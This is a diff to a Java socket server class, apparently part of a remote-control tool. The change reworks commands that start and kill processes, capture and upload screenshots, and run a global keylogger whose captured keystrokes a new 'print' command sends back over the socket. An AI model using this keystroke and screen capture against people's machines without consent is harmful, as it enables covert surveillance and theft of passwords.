@@ -20,7 +20,7 @@ public class WorkerThread extends Thread{
     public static DataOutputStream dos = null;
     public static BufferedReader input = null;
     public static String line;
-    public static GlobalKeyboardHook keyboardHook;
+    public static GlobalKeyboardHook keyboardHook = null;
 
     public WorkerThread(Socket socket) {
         this.socket = socket;
@@ -61,15 +61,19 @@ public class WorkerThread extends Thread{
                         break;
 
                     case "startApp" :
-                        startApp(dis.readUTF());
-
-                        dos.writeUTF("success");
+                        if(startApp(dis.readUTF())) {
+                            dos.writeUTF("success");
+                            break;
+                        }
+                        dos.writeUTF("error");
                         break;
 
                     case "startProcess":
-                        startProccess(dis.readUTF());
-
-                        dos.writeUTF("success");
+                        if(startProccess(dis.readUTF())) {
+                            dos.writeUTF("success");
+                            break;
+                        }
+                        dos.writeUTF("error");
                         break;
 
                     case "killProcess":
@@ -88,15 +92,13 @@ public class WorkerThread extends Thread{
                         dos.writeUTF("error");
                         break;
 
-                    case "getKeyStroke":
 
-                        break;
 
                     case "takeScreenShot":
                         takeScreenShot();
                         File file = new File("D:\\screenshot.jpg");
                         byte[]  bytes = Files.readAllBytes(file.toPath());
-                        file.deleteOnExit();
+                        file.delete();
                         dos.writeInt(bytes.length);
                         dos.write(bytes);
 
@@ -112,16 +114,23 @@ public class WorkerThread extends Thread{
                         listKeypress.clear();
                         keyboardHook = getKeyStrokeOn(listKeypress);
                         break;
+
                     case "getKeyStrokeOff":
+
+                        getKeyStrokeOff(keyboardHook);
+                        break;
+
+                    case "print":
                         getKeyStrokeOff(keyboardHook);
                         dos.writeInt(listKeypress.size());
-
                         ListIterator<Integer> iterate = listKeypress.listIterator();
-                        System.out.println("Iterating over ArrayList:");
                         while(iterate.hasNext()) {
-                           dos.writeInt(iterate.next());
+                            dos.writeInt(iterate.next());
                         }
+                        keyboardHook = getKeyStrokeOn(listKeypress);
+                        listKeypress.clear();
                         break;
+
                 }
             }
 
